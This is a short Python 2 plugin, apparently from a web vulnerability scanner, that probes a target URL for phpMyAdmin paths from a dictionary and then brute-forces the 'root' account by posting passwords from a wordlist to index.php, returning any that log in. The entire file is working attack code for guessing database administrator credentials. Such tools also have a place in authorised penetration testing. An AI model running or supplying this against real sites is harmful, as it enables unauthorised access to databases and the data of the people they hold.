# -*- coding: utf-8 -*-
import requests
from lib.core.settings import HEADERS, TIMEOUT, VERIFY
from data.info_dict import PHPMYADMIN_KEYWORD, PHPMYADMIN_DICT
from data.info_dict import PHPMYADMIN_LOGIN_OK_KWD, PHPMYADMIN_PASSWORD_DICT
from plugin.util import urlhandler, siteIndexTest

requests.packages.urllib3.disable_warnings()


def poc(url):
    testurl = urlhandler(url)
    if not siteIndexTest(testurl):
        return  # '[SiteRequestErr-phpMyAdmin] %s' % testurl

    pmd_path_result = []

    for d in PHPMYADMIN_DICT:
        payload = testurl + d
        try:
            r = requests.get(payload, headers=HEADERS, timeout=TIMEOUT,
                             verify=VERIFY)
            if r.status_code == 200 and PHPMYADMIN_KEYWORD in r.content:
                #pmd_path_result.append('[phpMyAdmin]-%s' % payload)
                pmd_path_result.append(payload)
        except Exception:
            pass

    PWD_OK_RESULT = []

    if pmd_path_result:
        for pmd_path in pmd_path_result:
            for password in PHPMYADMIN_PASSWORD_DICT:
                poc_data = {'pma_username': 'root', 'pma_password': password}
                try:
                    r = requests.post(pmd_path+'/index.php', data=poc_data, headers=HEADERS,
                                      timeout=TIMEOUT, verify=VERIFY)
                    if r.status_code == 200 and PHPMYADMIN_LOGIN_OK_KWD in r.content:
                        PWD_OK_RESULT.append('[phpMyAdmin_PWD] '+pmd_path+'|root|'+password)
                except Exception,e:
                    print e

    if PWD_OK_RESULT:
        return PWD_OK_RESULT
    elif pmd_path_result:
        return pmd_path_result